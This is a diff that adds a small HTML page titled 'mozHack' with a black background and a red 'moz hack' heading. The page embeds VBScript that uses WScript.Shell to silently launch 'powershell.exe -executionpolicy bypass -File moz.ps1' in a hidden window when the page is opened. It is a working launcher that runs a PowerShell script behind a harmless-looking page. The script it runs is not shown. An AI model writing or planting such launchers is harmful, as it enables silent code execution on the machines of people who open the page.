@@ -1,0 +1,25 @@
+<html>
+<head>
+<title>mozHack</title>
+<meta charset="UTF-8">
+</head>
+<style>
+body{
+background:black;
+text-align:center;
+font-weight:900;
+color:white;
+overflow: hidden;
+}
+</style>
+<body>
+<script language="VBScript">
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe -executionpolicy bypass -File moz.ps1", 0, True
+</script>
+<code>
+<h1 style='color:red;'>moz hack</h1>
+</code>
+</body>
+</html>
